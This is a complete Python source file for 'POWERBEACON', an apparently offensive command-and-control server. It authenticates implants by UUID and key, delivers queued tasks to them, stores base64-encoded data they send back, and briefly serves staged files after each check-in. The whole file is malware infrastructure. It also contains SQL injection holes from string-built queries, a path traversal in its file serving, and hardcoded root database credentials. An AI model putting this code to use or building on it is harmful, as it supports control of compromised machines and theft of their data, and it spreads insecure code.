#!/usr/bin/python3
import MySQLdb
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import ast
import time
import threading
import signal
import sys
import os
from datetime import datetime
import base64

should_get=False             #controls whether thge server is active
stop_threads=False           #stop the thread resetting should_get

#####controls whether GET will be answered.  Is OFF except for 5 seconds after auth
def unset_should_get():
    global should_get
    global stop_threads
    while True:
        if stop_threads:
            break
        if should_get:
            time.sleep(5)
        should_get=False
        time.sleep(5)

class HandleRequests(BaseHTTPRequestHandler):
    def log_message(self,format, *args):
        pass

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"

        path=os.getcwd()
        req = self.path
        self.path=path + "/web_serve/"+self.path
        IP=self.client_address[0]
        try:
            global should_get
            if should_get:
                self._set_headers()
                with open(self.path, 'rb') as f:
                    data = f.read()
                    f.close()
                self.wfile.write(data)
                print(green+"[+]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[200 OK]"+default)
        except:
            with open(path+"/web_serve/404.html", 'rb') as f:
                data = f.read()
                f.close()
            self.wfile.write(data)
            print(yellow+"[!]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[400 NOT FOUND]"+default)

    def do_POST(self):
        global should_get
        purple="\033[35m"
        default="\033[39m"
        red="\033[31m"
        green="\33[32m"
        yellow="\33[33m"
        blue="\33[34m"
        
        dicto = {}
        line_check = {}
        send_task = ''
        #reads post request body

        self._set_headers()
        try:
            content_len = int(self.headers['Content-Length'])
            post_body = self.rfile.read(content_len)
            post_body = post_body.decode("utf-8")
            new_obj = ast.literal_eval(post_body)
            IP=self.client_address[0]
        except:
            IP = self.client_address[0]
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(yellow+date_time+"[*]Request from  IP: " + IP + " :::Malformed Request"+default)
            return 0

        #Identify UUID
        connection=MySQLdb.connect(host='127.0.0.1',user='root',password='toor',database="powerbeacon")
        try:
            UUID=new_obj["UUID"]
            key=new_obj["key"]
            request=new_obj["event"]
        except:
            IP = self.client_address[0]
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
            return 0

        cursor=connection.cursor()
        #check if implant exists at all 
        query = "select * from implants where UUID='" + UUID +"'"
        cursor.execute(query)
        results=cursor.fetchall()
        if (len(results)<1):  #if it doesn't exist write implant not found
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
            connection.close()
            return 0
        ###Check if key matches    
        query = "select * from implants where UUID='" + UUID +"' and implantkey='"+key+"'"
        cursor.execute(query)
        results=cursor.fetchall()
        if (len(results) > 0):
            if (request=="req"):##only is requests
                cursor.execute("update checkins set last_checkin=now() where UUID='" + UUID +"'")
                cursor.execute("INSERT INTO allcheckins (UUID) VALUES ('" + UUID +"')")
                cursor.execute("commit")
                should_get = True
                query = "select task from tasks where UUID='" + UUID +"' and is_complete = 0"  #check for tasks...we should only do this is it's a request.  fix this later
                cursor.execute(query)
                results=cursor.fetchall() ###results is tasks
                
                if (len(results) > 0):#if tasks are greater than none
                    date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
                    print(green+date_time+"[+]Incomming Request from " + UUID + " at IP: " + IP + " :::Tasks delivered"+default)
                    #prepare line to return
                    send_task=''
                    for result in results:
                        send_task=send_task+str(result[0])+";"
                    self.wfile.write(send_task.encode("utf-8"))
                    ####and update the tasks so they are complete
                    query = "update tasks set is_complete = 1 where UUID = '" + UUID + "'"
                    cursor.execute(query)
                    query="commit"
                    cursor.execute(query)
                    connection.close()
                    return 0
                
                else: #if no tasks
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(date_time+"[-]Incomming Request from " + UUID + " at IP: " + IP + " :::No Tasking Available")
                    connection.close()
                    return 0  #end of if for requests
            elif (request=="send"): #post data to server
                try:
                    data=new_obj["data"]
                    details=new_obj["details"]
                    data=base64.b64decode(data).decode('UTF-16LE')

                    query="INSERT INTO datastore (UUID,data,details) VALUES ('" + UUID + "','" + data +"','" + details +"')"
                    cursor.execute(query)
                    query="commit"
                    cursor.execute(query)
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
                    connection.close()
                    return 0
                except:
                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                    print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                    connection.close()
                    return 0
                    

            else: #request type is bad
                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                connection.close()
                return 0
                

        else: ###if key doesnt match
            date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
            print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
            connection.close()
            return 0
    def do_PUT(self):
        self.do_POST()


host = ''
port = 80
print("[+]Starting POWERBEACON Server")
reset=threading.Thread(target=unset_should_get, args=())
reset.start()
try:
    HTTPServer((host, port),HandleRequests).serve_forever()
except KeyboardInterrupt:
    print("\n[*]Shutting down server")
    stop_threads=True
